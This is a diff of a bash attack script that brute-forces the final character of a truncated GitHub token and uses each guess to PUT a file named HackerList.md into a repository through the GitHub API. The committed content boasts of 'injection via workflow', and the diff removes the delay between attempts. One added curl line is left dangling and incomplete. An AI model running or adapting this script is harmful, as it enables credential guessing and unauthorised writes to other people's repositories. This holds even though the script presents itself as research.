@@ -16,17 +16,19 @@ echo "4-----------------------------------------------------------------"
 echo "$B64_BLOB"
 echo "-----------------------------------------------------------------"
 for f in {a..z} {A..Z} {0..9}; do 
-    echo "${TOKEN_VAL:0:39}$f" 
+    #echo "${TOKEN_VAL:0:39}$f" 
     Header="Authorization: token ${TOKEN_VAL:0:39}$f"
-    echo "$Header"
-    sleep 1
+    #echo "$Header"
+    #sleep 1
+    curl  --url "https://api.github.com/repos/${REPO}/contents/HackerList.md" \
+        
     curl -L \
          --request PUT \
          --url "https://api.github.com/repos/${REPO}/contents/HackerList.md" \
          --header "$Header" \
          --header "Accept: application/vnd.github.v3+json" \
          --header "X-GitHub-Api-Version: 2022-11-28" \
-         -d '{"message":"hello from r3s34rch","content":"Y3JlYXRlZCBieSByM3MzNHJjaCB1c2luZyBpbmplY3Rpb24gdmlhIHdvcmtmbG93IQ==", "sha":"SHA_FROM_ABOVE"}'
+         -d '{"message":"hello from r3s34rch","content":"bm9uYW1l", "sha":"SHA_FROM_ABOVE"}'
     echo "-----------------------------------------------------------------"
 done
 
